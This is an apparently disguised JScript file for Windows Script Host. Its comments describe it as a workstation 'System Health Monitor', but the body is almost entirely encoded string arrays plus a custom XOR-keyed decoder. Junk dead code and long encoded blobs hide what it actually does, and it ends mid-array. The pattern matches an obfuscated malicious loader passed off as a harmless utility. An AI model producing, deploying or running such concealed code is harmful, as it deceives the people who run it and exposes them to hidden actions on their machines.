// System Health Monitor -- Workstation Edition
// Periodic diagnostic utility for Windows endpoints
// Verifies hardware baseline, critical services, and network connectivity
// Build 4.6.837

var numHost = [
  "aI3sH4L9ahW_QAm-rv", "Axm", "k5m-k53vthH-k5m-kTn-k4CdHI3.QARfPx3hr5d0MTQlR1LYQAs_k-", "kF85Zxm9kqRnUACn8Am-UNCcH43_Qm", "k5m-kF8_85dTtNdCj4RnUNX1QxgAtN0Sr_eLHoe1QARSk5dEtNWnQAk-k.XsjNaeCICdHI3.QARfPo70QxHOkqv",
  "aI3cH5dyQAChtNR_k5dMUNd_k5Cx8ARn3E7St~k-Pa7~Hoe~LNRntNeYk6RJjE7Y8EWXLheY8E_Y8Na", "tNU-Z5dYjIL-ZF8_85dyQAChtNR_k5dMUNd_k5Cx8ARn3E7St~k-Pa7~Hoe~LNRntNeYk6RJjE7Y8EWXLheY8E_Y8NaJZxgV", "3FXyah7~8o7~ah7sHoRuyIC.QAk", "an7r3aRakFXsjNa-3_CKyxgAtN0Sr_eLHoe1QARSk68k37C6kFXsjNaeCv", "AxgYjIL-QoedjoL",
  "xF9T77WyjhQn8h6~Q7WRtNR~jIRcQ43HaEeIQACytE7ij6vWA6RuQNWixN3SAFdJUICcHheo85XLjI8_H_RuQNWiAF70QNRd8E_cj_gcjE_1pL", "3E7iQA3_3o_iQL", "k5m-k6C_jNehQxdC8E79k53vth8LUA3uk5dEjIC1Qxm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQL", "7I7kQNWvQACl", "k5m-k5m-k5gAtE7~QxdKUoJ_UIL-p~m.A~XTjhd9UNX.yE_YQxm9UNX.k53lP.RcjNdsjo3rtNX_k5dYjI39UA31t5m4PxnuHh7~8o_1QAWSQAChQAC2UhnJC~gekqv",
  "aIQ1yN8~Av", "C736y7m_", "ao79jIQ_Pa_nQNdLHoevQACnpxm9aE6nt5m4xF9T7yJHaheo8q8sHo7HyN_1HoeSjhQnA6gc8h7~ahs_jEWHr7WytE7ijF_.HdWRtNR~jIRcQ4LYaEeIQACytE7ij5H-PaXsjNa-3As_UI7ntNeYaEeitNRXk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "yN60LhWcUh9yHE7_Qm", "k5m-k5m-k5gAtE7~QxdKUoJ_UIL-p~m.A~XMUNd_k5d9UA31t5gjHo74QAs8M1J6HhRsHEauCqaSZxgeZL",
  "aIgs8hXCj4RnUNX1Q72", "k5m-kEQcHOmuCE.-KxmWM~m.txm9jEa-CFdspF6n8E79Hq3SM~m.txifZxgV", "x6HDkm", "QAsvjEe~QAkYQAs_", "CqLSkTn-yo7IP7R1tE7.8NW_Q63sHh9yQA3ntNX4HdR_85m9LNWijI8y8E6~8F_oyhX5UA3nQACJQAr-Pa3cj43y8EevxNQqjh_YQneYLo6n8E7~tN7Sk5d6pE718A3JjhXatNd_yE_9tAL-Z69atNd_aIgsj_nDM_J_Ho2Jk5dR8NWntAgiQa_YHI3sjoR_H~gCQhXcHo7MQAH-P7RnUACn7hs_j.6hUN_iUNCiQL",
  "xaXC75gAL7CMMOgSQAChtNR_k6i", "A62", "a.7qAn3AydCF", "k5m-k6R_85dTjhXnQNXnk5dLUA3uk53.rxm97o6i8Na-Cq3fk5d6joRcQE_YQ~gganRCxxm9yoeMQA8itNX_", "aA7J8m",
  "7n6xyOgYQALDkEXckE618E_hQxgsQE6v8E7~kEQc8NX.", "Qoe~k5-.txmekTFVk53Jk5diQxmSM~m.txifZxgV", "an7r3aRak6RnUA3_kFQxynn-7h_YrSClah7~8o_1QxgAxF7x3xgMUNd_KxH", "k5m-k53.j67~j5m-kTn-kosn8qgSMO2cQh_ntq7OPoRcjxe~8ARnQE7St~e~8ARnQE7St~e~QNW_UAR_H~e.jI8YjEesQ52.81mcCqgfQ~k", "aI3sH4L9ah7~8o_1Qxm9yo69QxmOa47S8F3_HhiOk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_",
  "k5m-k53lUAa-Kxm9toeJjOsmZTFIR~v~RTUir1r~PTknrOv~rTUir1rXPTFIR~.-l5gEjIC6UNRuPaeOto7185gVk691tE6~Ax-.A~m9U4scHOmvpT_5ZxgeZL", "CqLWkTn-yo7IP7R1tE7.8NW_Q63sHh9aHo_4Qh7~k5dg8FWcQneY", "k5m-k5m-k5m-k5m-xNXhjh9_P7C_HI3RQA3ujhL-P77~txm.8ym-Pad_8EscQ5gLjIRnk5d5jh3Xk5sqQAL9LheY8E7Y85m.A~XE8NWiyo69Qxm9ao6IZxm9LheY8E7Y863XHEa-ko6vHEWJUh6ntNeYPhJSjh0Ok5dkQN6.QACSk53uQ5m97E_9QNed86R_U~mWr5m93AC~jICgUI3Jjh0-aI3cHm", "CE3nkTn-Nhe~QE7~QN38Lqi", "kTXY8Nv-r10orL",
  "CELWkTn-xoeJjOdLUA3uk53.r5mOHE7_HOXfQA.O", "ydrDkm", "AxgYjIL-H47Yjo_YQ~mu", "k5m-k6R_jE7185dKUoJ_UIL-PaQJH4RnkTF-Pa70HE6YQ6g~jIg_H43XkF_LLN3.Ho7SH~.", "HEeIQACStE7ij5m9yoeLHoeotNW_k5dEtNW_k5k"
];
var kuntginChounlai = [
  "k5m-kE_ok5-9joenk5sl3dm-P77~j5m.QEW7Hov-Paed8FQJjEa-CqgfQdgs8E--Pa70HE718E7.ah_DQxm.81k-Pa70HE718E7.ahssr1ahk53hrx.Jkqi-QAsJ85mWkqn", "aIQ1ah7~8o_1QL", "kE3YHSn", "3o_iQa70tARnHv", "3As_Ud6dQACX",
  "k5m-kF8_85dTtE_iQF_nQNn-P7gs8E--CELvk5dEtNWnQAk-k4RXjoRlZOX.UALOk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_kqv-ao79jIQ_Pa_nQNn-PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "k5m-kEeSk5m-k5m-k5m-k5m-k5m-kTn-CE2v", "M500P1-YMm", "k5m-kqn", "k5m-k6R_85dTjhXnQNXnk5dLUA3uk53oUOm97o6i8Na-CEC.pxm93NX1jh3JjoH-773EMm",
  "ahR~tAgntNX4P.QJjE7ypARnQNdKUoJ_UIL", "k5m-k69OjheiAxsqQAL9yEe1UNWqHoedHFd_jNC_HOm9an_Fk53Stxm93AC~jICgUI3Jjh0-aI3cH5g2", "k5m-k5m-k5m-k5m-k5m-kE_ok5-.Hh_DQaefk5dsjoL-CEssHhsKt~.-p~g~QA3dHo0-Cq3~8Na-lL", "k5m-k5m-k5m-k5m-7ICJ8Ea93AC~jIk-kOk-Pa7~Hoe~LNRntNeYk6RJjE7Y8EWXLheY8E_Y8Na", "HEeIQACStE7ij5m97h_YQEeIaI3XjEa-xE_.QE7Yk5dEtNW_k5k",
  "8I7s8AR_H4U", "k5m-k6RnUACnP7g~jhR_HIr-k4gc8h7~Hhs_jEvYQAs_kOm9LAC48Nd_j43rtARnk5k9yoeYxNXnQACsUI3J8oa-PaXcaqCcQo_iQxm93As_UI7ntNeYaEeitNRXkFCXHE6SH~m93o_iQxg-kO3l8EmOkOm97h_YQEeIaI3XjEa-xE_.QE7Y", "3As_Und_8EscQ62", "k5m-kE_ok5-9joenk53DQO.-p~gntqCc8~mOQOk-lL", "7h_Y3E_sQd2",
  "k5m-kE_ok5sqQAL9Lh_9xNXS8E6YUha-7h_YrSClaqCcUh7SH~m93o_i8E7~k5CMUNd_Kx8~8ARnQE7St~X_pEa4kOg2", "k5m-kqCdHI3.QARfAh_.k5m-k5m-kTn-Cqkv", "yasDkqv-a.6RMOm", "8qCXkqi", "k.m",
  "AE3_U474P48cHo9LHo7h", "k5m-k53oUOmekFJctN09aE6nt5m.QTm-Z5CSpNX1AIivlxX.UALOk5dok5sqQAL93E6nQxm93oe~jN6nk5CXpA_Xyad.Q5dkxEd9HIrOZx.", "ao79jIQ_Pa_nQNn-PaWJ8E7~UNWLUA3uk53Rpa_Y8oe1UA3Jjh0YyA_Tjhd9UNX.P_gs8E--PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "LIC_UA3_3oeiQE7~", "tNU-Z53Y8~.-p~m.Qq3jko64QNXnAI3cth7Yk_n-Kxm.8Ei-lL",
  "k5m-kEWcQh8_Q6edHh7~k5m-k5m-kTn-tNU-Z53drO.-p~m.8yk-lxg_jqR_kqi-CE7Y81J7an7xy.6R3xge", "k5m-k5m-k5m-k5m-k5mOCE7Y81JLHoe4Ho693E6nU7WRtNR~jIRcQ43H7h_YQEeIHdWy8E6~85gRQNXdA6g~jh8~UNdSA6CdHI3FQARfkO.", "k5m-kq3uHoeIk5kO", "a.7qAdRt", "aI3sH4L9aqCcUh7SH~m93o_iQ7gs8E--CEFWk5dgHo8djN7Y8FWJHIL-kOn9Uhn9jo298N.Ok5dAtNX.jI8y8q_iQxgktN3.QN0",
  "k5m-k53LHoe4Ho7SHdg~QNQ_Ho7YUha-Kxm4ah_iQNXnjq_TjhXntNXdQxH", "k5m-k5m-k5m.Qov-Kxm.8qCdQyi-U4C_UNi", "ao74tARnQAk9ahRuQN3djE7.7E6St~m97E6StnXsjNa-CE0vk5dgUI3Jjh0-CqLvk5daHo_4Qh7~k53nrxm9aqCJjoRJHE6ik53nrOm9ah7n8E_YQIr-CqLSk5dEjIC1Qxg2kFed85dM8NWi", "xNXLUACsjN7nQACS", "CEXIkTn-PNXc85mu7E7S85dLUA3uk53.rx.",
  "k5m-kqn-Uh6nUh--p~gy8E6~85dyjE7_H5m9ah71jhX.H~murOm/k53JZxge", "CELvkTn-k.rDA6g~jh8~UNdFUA3sA6CdHI3FQARfk-", "k5m-kqgsHIRIjIC.k5m-k5m-k5m-kTn-Cqgf", "k5m-k5m-k5m-k5m-aI3sH4L9aqCcUh7SH~m.AIm-Pa6~QI79QNXnyE_S85mOPNF-U5k", "aI3sH4L9ahW_QAm-P7R_UheYQqr-RL"
];
var copyInfo = [
  "8h_YjN898qrDph_9HE7~HheYUA3JjhXrQAQ_jTdJjAg_H4Rcjo6nQAnsA6vYAqCcjI3HUh_981k", "xF9ry7WyynQa7n6x37WlUIQlAm", "AnRr", "k5m-kqgsHo69Z537Hovik53K8A3EtNW_P5m.3AsvQNRnQN3ytAJ_kTn-r5v-CF70HE718E7.ahssr1ahkTn-kOkik53RUAsg8q3_jAgnH~mekTLJ", "k5m-k5m-k5m-k5m-tNU-Z63_HIL9aE6nt5m.yI7n3o_iQx.-pv",
  "yE6S8FCcjI37H63JjNa", "COm.UyF-Pxd1jhXotNH-Z5U-C6eok53lQNrJ", "U5L", "34C_Q7gupARJUh6iyN79jICX", "CqrvkTn-3h7nP7R_H4QJUha-PaXsjNa-k_CdHI3FQARfkOm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQL",
  "an7r3aRakFRsHq3Jjh0ik6Q_H4RJjh0ikFeyLAC1tE_nQNRn8AC_kFQxynn-7h_YrSClyIg_Ho6ntNX4aI_S8E79", "COm.UyF-PxdcHq3Jjh0-8o7~tNQJUh6ntNeYPNd_8EscQ5gdHha9HE7~jN6YQNXnPAgsHIRIjIC.", "LIC_UA3_7E708FQJjEa", "CqUWkTn-ko7sQN3_U1mvMTs_R1-IUoUnRoUIUSLhUy_1Ro7sRyLXrhR_Ry6orSFSRE3oQTQsUhC_QEknRhkdU1.WrSU~RSLO", "x7ggQE3~QARS",
  "3NXdjN7~UA3cH-", "3h7nyhC/", "LSu", "y._TNv", "QNRn",
  "CqUvkTn-k1FYR50Xk-", "7h_YrSClaqCcUh7SHdRnUACn8Am", "ahR~tAgn347ijFXsjNa", "COm.UyF-PxdvUARS8he~Q5m.HEi", "k5m-kER9AhXcAI7JAICdjoXJjoH-kTn-CErv",
  "k5m-kF8_85dTtE_iQF_nQNn-P7gs8E--CELvk5dEtNWnQAk-k4RXjoRlZOX.UALOk5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_kqv-3oe~3N61t5dKUoJ_UIL-pv", "8qCXkqi-ao79jIQ_Pa_nQNn-C~LuC6eSQ.3JHOm9Ho7vjE61QxmOC~kikOH4kO.4k5dEjIC1Qxm93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQxgekERs8ERukq9e", "k5m-kE_ok5-.QSmYUh_npx.-p~mOC5-.QSmYUhedj43~px.ik5LuCEHvPoRJ8q.JkOgekE7iHha-p~mOkOge", "tNU-Z53lHhU-PN6YQ5mu7E7S85dLUA3uk53lHhUJZxgV", "LNRntAQ_",
  "CEFvkTn-k.rDA6g~jh8~UNn-3o_iQARHa47S8F3_HhiO", "k5m-k5m-k5m-k5m-ao79jIQ_Pa_nQNn-C62Y347ijFXsjNa-PaQcHoR_", "C6eYKxd/jh_YNhRuUACjA7nuryF~PT.XPT.IPTFvM5vWryHiMyHiRTUirymWPTF~r5vWrTFJ", "7h_YrSClaqCcUh7SHv", "k5m-k53lUNU-Kxm9toeJjOsmZTkdr5v~RTUir1r~PTknrOv~rymir1LdPTknrOv~rS.ir1kWPTkdr5v~RTkir1LIPTkdR5v~RyaJkqv-3oe~3N61t5dKUoJ_UIL-p~gjUhssH_nuC62-PNC0jIk-rq-XLO.-lx.",
  "UNC1QE7oQhsJto9ijNXcHq6~HI3d8480pAuvrykSRTahRS-X", "C7n", "k5m-k6RnUACnP7RiQN7vk5dyQNRcjo3SkTk", "Lhe9jN6YQFWJjoa", "k69ryn6Fkm",
  "k5m-k5m-k5m-k5m-k5m-k53StAJ_yhi-KxmuCF70HE718E7.ah_DQxm9jEa-r5m9jIk-ZF8_85dC8E79k53K8A3EtNW_ZxXrQNX48E--PN7Wk536pqg_UI3_Q6RJpoaJ", "aI3sH4L9ahW_QAm-P7R_UheYQqr-rv", "k5m-kFX_8~dyQAChtNR_k5dMUNd_k5Cx8ARn3E7St~k-PaCJjo6~p7gs8EsMUNd_k5C-kO3srNmOk5n9Hh7~8o_1Qxk-Pa3JHIgiUA_MUNd_k5Cx8ARn3E7St~gyQAChtNR_kOm9aI3sH43dH63XHEa-LA7njhds8E_1kqv-yI7nPaXdjEv", "Q47YUI3Jjh0-AnRrkqi", "yak-Q4C_QL"
];
var workDir=[0xbe,0xb4,0xe6,0x87,0x95,0xe5,0x96,0xa2,0xb8,0x90,0x89,0x83,0xa1,0x81,0x9e,0x98,0x9f,0xe0,0xab,0xaa,0xb2,0xe4,0x9d,0x92,0x86,0x82,0xa7,0xb9,0x9b,0xeb,0xa3,0xbf];var bindMap=[40,0x76,74,52,43,90,0x6a,49,0x70,79,42,99,0x6c,60,92,0x66,0x73,82,0x7b,86,0x6b,97,0x6d,76,53,93,65,83,55,96,0x72,66];var formatHandle="";for(var resultKey=0;resultKey<0x20;resultKey++)formatHandle+=String["fromCharCode"](workDir[resultKey]^0xd3);for(var swapDir=0;swapDir<0x20;swapDir++)formatHandle+=String["fromCharCode"](bindMap[swapDir]^0x05);
var dataCheck = [
  "k5m-kERcjAgd8E7~AhXsjNa-k5m-kTn-CE7Y81JTyndL7736a.Xgyaa", "k5m-k5m-k5gy8E6~85dyjE7_H5m9ah71jhX.H~mur~m/k53JZL", "k5m-k68uQAC_PaeOto7185gVk53lP._LLN3.Ho7SH~m9joenjE_fQxmOrykIPOuOk5dsjoL-C62Yx7ggQE3~QARSk5dYjI3itN9_k5kWR1.Yr1anPOuOkqn-lm", "7n6xyOgYQALDkm", "yEesQ6g_HoR_j43sQha",
  "3h7nP7g~jhR_HIr-H47S8E3_Hhi-Pa7~Hoe~LNRntNeYk6RJjE7Y8EWXLheY8E_Y8Na-l5gy8EevP7g~jhR_HIr-PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "k5m-k5m-k5m-k5m-xNXhjh9_P78_U_C_HA7_HIL-P77~txm.7ACik5dK8A3EtNW_k53K8A3EtNW_k5d7Hh75UARJUdgsH4RJjoH-P73JjN7c8A3yQNr-R1m-Pa7~Hoe~LNRntNeYk6RnjIm", "34C_Q7RvUNR_", "k5m-kqR_H4QJUh7lHI3s8q7Sk5m-kTn-tNU-Z53Sr5.-p~m.HSmYaI3s8q7SP_3caI3~tNX4Z5.-lxg_jqR_kqi-k.dJHIRJjoHOkqn", "AdR7",
  "kE_vKL", "CqaSkTn-tNU-Z53drO.-p~muCqa~k5dSHEWJ85m4A6v4Z7i9r7n-lxg_jqR_kqi-CE7Y81J7an7xy.6R3xge", "an7r3aRakFXsjNaikFXdjNC_H.eoLhe~QArikFdspFRijhRfaIg_QNLikFWcUN3LQAC1QNXnUN8_kFQxynn-7h_YrSClaqCcUh7SHhe~", "CF7~Hoe~LNRntNeYaqC_Qo7~QNX1Qxmek5Cy8Eevk-", "k5m-kE_ok5-9joenk5saQARnP7gs8E--CEFWZx.-p~g_pE_nkTF-lL",
  "k5m-kE3ckqi-AnRrM~gy8E6~85dyjE7_H5m9ah71jhX.H~m~kqn-8hsJjEa-Z5sqQAL93E6nQx.-PNWnk53.j5.", "7EenUNWNtARJUoW_yN79jICXah_DQL", "k5m-kqgdUoWJUdeJH5m-k5m-k5m-kTn-Cqmv", "xaXC75gAL7CMMOgvHoe1QARSk6i", "3E7SUICJHq3Jjh0",
  "k5m-k5m-k5gJQOmuZ63_HIL9aE6nt5m.UyFJk5dsjoL-Cqg~P.ssHn70tA3_Q5.-p~gOHo7st~ge", "37CxkE_YtAL-QE_StSu-", "CqU~kTn-r1LnRSknrSk", "7n6xyOgSpArDkm", "k5m-k6ey7L",
  "3AsvUNX.3NXhtACcjod_j43y8qCJjo8S", "CE.vkTn-ZF8_85dMQA3CaF6.QqC_HIr-Pa6.QqC_HIREUNdJjq.-x7ghR5m93AC~jICgUI3Jjh0-ah_iQNXnjq_TjhXntNXdQxg2", "CqankTn-8qCXkqi", "k5m-k5m-k5gy8E6~85dyjE7_H5m9ah71jhX.H~m~M~m.8E2-Pyn-r-", "Loec8Tu-",
  "C6e_U~mekFmurqsTLOvvpTsgPTg0rSkirqsF35vvpTLdPTg03yrirq-n3OvvpFrdPTg0MyUirq-hROvvpTHSPTg0rTrirq-03xvvpTanPTg0Maairq-~rxvvpFrIPTg0Ryrirq-W3OvvpF7TPTg03yairq-vR~vvpT7gPTg0L1Lirq-SRxvvpFkSPTg0L1-irq-~RxvvpT7FPTg031-irq-d3OvvpFk0PTg0RFLirq-IR5vvpTkWPTg0Lymirq-W3xvvpFanPTg0Maairq-vRxvvpT85PTg0Rnrirq-S3xvvpFknPTg0L1Firq-d35vvpT-hPTg0L1rirqsT35vvpTaWPTg03Tmirq-W3OvvpT7EPTg0r1mirq-~rxvvpT_6PTg03y-irq-X3xvvpTmdPTg0ryHirqsEMxvvpFkSPTg0Ly.irqs5rxvvpTr0PTg0RS-irq-d35vvpTgTPTg03T-irqsERxvvpTLvPTg0LaLirq-IrxvvpFkXPTg03FFirq-035vvpFFdPTg0R1Lirq-Sr5vvpFFXPTg0RTrirq-vr5vvpTrXPTg0rSUirq-Xr5vvpTgEPTg0ryLirq-h3xvvpF7EPTg0rFFirq-d35vvpTk0PTg031rirq-S3OvvpTmIPTg0rnairq-~MxvvpTrXPTg0MaUirq-WL~vvpT36PTg0RS-irq-nr~vvpFLnPTg031Firq-WrxvvpFREPTg0r.Lirq-nLOvvpTadPTg03y.irq-nL~vvpTLhPTg03ymirq-0L~vvpF3FPTg0r.rirq-~R5vvpTQFPTg03Tairq-0r5vvpTgFPTg0MFUirqs6M5vvpT8TPTg0L.airqs6MxvvpT3EPTg0L1-irqsTrxvvpFaWPTg0RTUirq-Wr~vvpTgTPTg0rTairq-IRxvvpFr~PTg0r1Hirq-h3OvvpFCTPTg0LaLirqsFR5vvpTRTPTg0rFLirqsgROvvpFUXPTg03.Lirqs6R~vvpFFhPTg0rnrirqs6MxvvpF75PTg0MaairqsTR5vvpTgFPTg0MT-irqsTR~vvpFrSPTg0rSairq-WLxvvpFkdPTg0rFFirqsEr5vvpTQ6PTg0rTFirqsFR5vvpT_TPTg0r.kirqsgrOvvpTkhPTg0RSkirqsTRxvvpT.XPTg03yUirqsER5vvpTUXPTg0LyLirqs6LxvvpT_EPTg0RTFirqs5r5vvpFFIPTg0MyHirq-~35vvpTgTPTg03arirqs5R5vvpTaXPTg0L1Hirq-vrxvvpT6FPTg0r1Firq-S35vvpT_5PTg03Fkirq-d3xvvpT65PTg0ryrirqs5MxvvpTaSPTg0MT-irq-SL~vvpTFXPTg03aairq-IM5vvpFkhPTg0LyairqsTMx.", "ao79jIQ_Pa_nQNn-U53Rpa_Y8oe1UA3Jjh0YyA_Tjhd9UNX.P_gs8E--PaQcHoR_k5d6H4CcH.618E_cjOgytNW_j43ipaRcj43Jj47_", "C7g~jh8~UNdFUA3sCL", "k5m-k5m-k5gnH4.-pv", "aIgcjhW_H-",
  "Q47YUI3Jjh0-An8Lkqi", "k5m-k5m-k5ge", "37CxkE_YtAL-HqCcUh7SHh7SMOm", "k5m-k534r5mekF_Y8oefQxdxQARnyN7ntEe.k5d7Ho.-kosn8qgSMO2ctAgItE2YtArcCqmvkOm97AR_Lo6StNRLUACStNX4k5datNd_jI7nah71kTa", "kqv-yN79MOm",
  "a47Yjo_YQv", "7ICJ8E7rtNX_", "k5m-kEWcUh6iAh_vk5m-k5m-k5m-kTn-CE.v", "k5m-k5m-k5m-k5m-7hs_Hoa9yhC/QNRnkqi-C62YLhe9jN6YQFWJjoa-PNds8ERuk5H9PAR_H4Q_HOH-lx.-pv", "kqv-"
];
function saveHost(i){
    var _r=[numHost,kuntginChounlai,copyInfo,dataCheck,sortKey,flagMin,flushFile];
    var s=_r[Math["floor"](i/0x2d)][i%0x2d];
    var r="",b=0,bits=0;
    if (WScript["Version"]["length"] < 0x11) { var acc7571 = 0xf1e; acc7571 = acc7571 * 1; }
    for(var numNode=0;numNode<s.length;numNode++){
        var pollNext=formatHandle["indexOf"](s["charAt"](numNode));
        if(pollNext<0)continue;
        b=(b<<6)|pollNext;bits+=6;
        if(bits>=8){bits-=8;r+=String["fromCharCode"]((b>>bits)&0xFF);}
    }
    return r;
}
var sortKey = [
  "CqLvkTn-yo7IP7R1tE7.8NW_Q63sHh9gUI3Jjh0-Pa70QNRd8Ea-kO3srxk-Pa6~QI79QNXnk5k9PNR9PNXcPA7Jk-", "CEQikTn-CEQsjqR_", "k5m-kEWcUh6ntNeYk5m-k5m-k5m-kTn-CEvv", "k5m-k53DQOXyQA3NUNWdQx-.j47ij5v-Cq3~8NaJ", "k5m-k53vth8LUA3ukTn-xoeJjOdLUA3uk53_j4UD7F7Ra5m.HE94",
  "37CxkE_YtAL-HI_SMOm", "a47Y", "CEC.pxmek53.85g2kFRcj4Q_H43aj~dZHheY", "CEFWkTn-xoeJjOdLUA3uk53sr5mOH47S8E3_HhiYQAs_k-", "CErvkTn-NhCcjhW8ZF8_85dTtNdCj4RnUNX1QxgAtN0Sr_eLHoe1QARSk5dEtNWnQAk-k.XsjNaeCICdHI3.QARfPo70QxHOkqv-7hs_Hoa9yhC/QNRnkqi-C62YLhe9jN6YQFWJjoa-PNds8ERuk5H9PNR9PNXcPA7JC~geZL",
  "k5m-k53DUxmek536pE718A3JjhXTjhXnQAsnP.8_863XHEauZxXgHIR_jNCipL", "UA36joL", "k5m-k53vHS6.QNv-l5gyQAL9LheY8E7Y85m.AIL-Pa7YUhe.tNX4k67a31-", "k5-", "k5m-k5m-k5g1UA31t5gV",
  "Lh6vUNRJ8q.", "3oeiQE7~3AsJHI3S", "37CxkE_YtAL-jo7n8he~tSu-", "CqgfkTn-PNJctN0-Z5-hRx0YMymJk5i-ZT.IPO0Wr1kJk5i-ZTL0PO0dR~.-l5gqQAL9ao6YQEe9k5dTjI7Y85mWROg2k5a-pd91tE6~Ax3llx.", "tNU-Z5dYjIL-Z63_HIL9aE6nt5m.UyFJZxgV",
  "3E6_jNeYkqRnUACnQNL", "k5m-k5m-k5gy8E6~85dyjE7_H5m9ah71jhX.H~mWM~gOHo7stv", "3nk", "k5m-k53nt~mek5d/jh_Yk5-WPO0hR5g2kFQcH.7sUh-9yhC/QNRnkqi-NhRuUAC8Z5-nM50YRyHJZ~-XR~0Yrym~Zxg2kF8_85dxUNX.jhnJkqnJ", "Ayu-",
  "y479Uo7~yhQTjIC_Hv", "k5m-k53Stxmek69ypARnQNnYah718ACJ8q.YaqCJjoRJHE6iP_R_UI7~tA3XxN3_j43JQo__H_nOa~nWPya9rSk9RyLnk-", "CqkvkTn-Z5U-CEFWk5n9Qh7nPN_.kqv-yI7nP7RnHo_YQ~.Y7qCJjx-J", "3E7iQA3_3oeiQE7~", "k5m-k5m-k5m-k5m-lL",
  "CqL~kTn-yo7IP7R1tE7.8NW_Q63sHh9LHo_YUh_vUNv-Pa8~jI7vxNL-k.C7xaWaxaXH7AR_H4rOk5dx8NXrQAQ_j5grtNdJ8E7.", "3h7n3qCJ8oa", "xaXC75gAL7CMMOgJj4RdQoQJUh__j4L-QE_St~gSHE61Qxmu", "CEs.kTn-Lqi-LA7ntEe~tAJs8E_cjOmek5C5QN6~QAk-C5sJQOmuCEXIZxgVk5U-C6eok53lQAL-lxg_jqR_kqi-Cq3fkqnJkOge", "Qoe~k5-.txmekTmVk53Jk5di85m~rTi-CE.fZ~.-pv",
  "Uhd.k5e1kqgJjoH-PN0-rxm98~m~rTmvkm", "NFeOto718m", "k5m-k5m-k5m-k5m-k5m-k53uUARuyhi-KxmuPNXc85m.3AsvQNRnQN3ytEF~RyUJk5dcHOmuZF8_85dEtNW_xE6St5m9aE6nt5m.yI7n3o_iQxm9LNW4jICJ8Es9k6RkLykdRO.YxE6St5m9QAF-CF70HE718E7.ahssr1ahZL", "aI_S3E_sQd2", "k5m-kq8utNW_k5-.8E2-PN8nkTmJkqi",
  "COm.UyF-PxdcHq3Jjh0-UAgvHoehQxd9jh3_kqgsHIRIjIC.", "C6e.jxmek5U-C6eok53lQNL", "C6e_Q5mekFmurq-dM5vvpF3gPTg0My-irq-vRxvvpTggPTg0RaLirq-X3xvvpFk0PTg0ry.irq-S35vvpTk~PTg0rarirqsTLOvvpT-nPTg0LS.irq-nRxvvpFF~PTg0R1-irq-XMxvvpFCgPTg0Rymirq-0R~vvpF6EPTg0MyLirqsF3OvvpTHvPTg0Ly-irqsERxvvpTa~PTg03Trirq-WM5vvpTkSPTg0r1Uirq-vM5vvpTHXPTg03yLirq-vM5vvpT.hPTg03yairq-nrOvvpTQEPTg0LSairqsgrxvvpTkIPTg0L1rirq-XL~vvpFCFPTg0My-irqsER5vvpFkdPTg0r1.irq-IR5vvpTC5PTg0MyLirq-XM5vvpFQTPTg0LnLirq-nLxvvpFa0PTg03yFirq-WR5vvpT-nPTg03.rirqsFLx.", "LhWcHha", "k5m-k53DUOmek53DUxXqQA3apAg_H~-Jkqv-7hs_Hoa9yhC/QNRnkqi-C62Yyo69Qxm9jE_fQxm.Ah6dkqn-l5gyQNW_UIL9yhC/QNRnk5dEtACS85mW"
];
var flagMin = [
  "7n6xyOgu8Su-", "k5m-k53vHOmek6RnUACnP7g~jhR_HIr-PaQJjE7LUA3uk53vth8LUA3uk5dgHo8djN7Y8FWJHIL-kOn9Hh_iQNXnPN_YHI3sjEvOk5dAtNX.jI8y8q_iQxgktN3.QN0-P7gsHIRatqCd", "yN7ntEe.Hd2", "CE2vkTn-ZF8_85dTtNdCj4RnUNX1QxgAtN0Sr_eKHE7~UA3Jjo8ypARnQNnJP.RsHq3Jjh0", "NnX_85XyQAChtNR_aEeJj43RUNXsQh7~AyuDah718ACJ8q_LHoenjhRcj5mek69MQALYah718ACJ8q_LHoenjhRcj63XHE78M1JajqrWr-",
  "U5kOk5dNQACOk6Cdj.6S", "C6eSQOmek53Rpa_Y8oe1UA3Jjh0YyA_Tjhd9UNX.P_gs8E-", "Q47YUI3Jjh0-AdR7kqi", "k5m-k53nj~mekT.v", "an7r3aRakFWsHI35jhen7AgatNd_P5gEHo7_aEsXHh_1UNWRQNdcH4.ik63c8E6i7o_StNCiQad_jNe~p7RJpoa-3_CKyxgAtN0Sr_eKHE7~UA3Jjo8ypARnQNn",
  "k5m-k53DQOmek53DUOXqQA3EtN7iQ5-.Ah6oP5gjao7ojE718E_cjOX5tNX.tNX43oWsQIR8M1JMjhXL8NCitNr-PNCcHOgjao7ojE718E_cjOX5tNX.tNX43oWsQIR8M1Jy8E6ntNrJ", "L4_vUARS", "an7r3aRakFRsHE61tA3XkFQxynn-7h_YrSClaEsXHh_1UNWRQNdcH4.", "k5m-k5m-k5m-k5m-k5m-k5gEjIC6UNRuPaeOto7185gVkFJctN09aE6nt5m.A~XE8NWiyo69QxmO3E7StI3cH6Wx8ARn3E7St~XijoiOkqn", "lxg1UA31t5gVk5kOkqn",
  "joenQAgsQ5X_pEa", "xEeS8EXsjNaDkm", "jNehQaX_pqL", "k5m-kq8utNW_k5-9joenk5LGZxgV", "k5m-k53ijo9SkTn-L5-OCE7Y81JL7aCrxaRH3E7StI3cH6Wx8ARn3E7St~XijoiOPm",
  "k5m-k5m-k5gekERs8ERukqi-lL", "CE0vkTn-k_CdHI3FQARfLhdMjd7Jk-", "k5m-k53l85mekFJctN09aE6nt5m.QNXhM_36y7m-Z69Cy~XLUA3uAyuD3h7nao6YQEe93o_iQaXsjNauZxmfk5kYHqrWkO.", "LIC_UA3_", "37CxkE_YtAL-HI_StNXojSu-",
